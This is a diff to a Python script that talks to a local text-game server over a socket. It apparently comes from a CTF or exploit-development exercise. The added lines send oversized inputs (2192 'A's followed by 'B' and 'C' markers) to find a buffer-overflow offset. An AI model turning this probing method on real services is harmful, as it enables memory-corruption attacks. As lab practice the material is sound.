@@ -1,4 +1,5 @@
 import socket
+import time
 
 s = socket.socket()
 s.connect(("localhost", 379))
@@ -16,8 +17,8 @@ while len(decoded) != 0:
         s.send(msg.encode())
     
     if decoded.__contains__("pick a name"):
-        #msg = "jack"
-        msg = "A" * 2000
+        msg = "Gorak\0"
+        #msg = "A" * 2000
         print(f">>> Sending {msg}\n")
         s.send(msg.encode())
 
@@ -26,11 +27,23 @@ while len(decoded) != 0:
         print(f">>> Sending {msg}\n")
         s.send(msg.encode())
 
-    try:
+    if decoded.__contains__("shall we drink to?"):
+        msg = "The Horde\0"
+        msg = "A" * 2192 + "B" * 4 + "C" * 20
+        print(f">>> Sending {msg}\n")
+        s.send(msg.encode())
+
+    if decoded.__contains__("shall you do now?"):
+        msg = "2"
+        print(f">>> Sending {msg}\n")
+        s.send(msg.encode())
+
+    try:        
         data = s.recv(1024)
         decoded = data.decode()
+        time.sleep(1)
     except:
         data = 0
+        decoded = ""
 
 s.close()
-
